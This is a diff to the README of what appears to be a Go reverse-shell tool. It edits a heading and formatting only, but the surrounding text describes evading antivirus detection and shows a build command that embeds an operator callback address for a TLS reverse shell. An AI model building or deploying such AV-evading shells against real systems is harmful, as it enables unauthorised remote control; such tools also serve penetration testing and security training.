@@ -8,7 +8,7 @@ It uses TLS to secure the communications.
 Although meterpreter payloads are great, they are sometimes spotted by AV products.
 The goal of this project is to get a simple reverse shell, which can work on multiple systems.
 
-## How
+## How ?
 
 Since it's written in Go, you can cross compile the source for the desired architecture.
 
@@ -23,7 +23,7 @@ For Linux:
 $ GOOS=linux GOARCH=amd64 go build --ldflags "-X main.connectString=192.168.0.1:9090" -o reverse.exe hershell.go
 ```
 
-Just use the GOOS and GOARCH variables to define the target.
+Just use the ``GOOS`` and ``GOARCH`` variables to define the target.
 
 On the server side, you can use the openssl integrated TLS server:
 
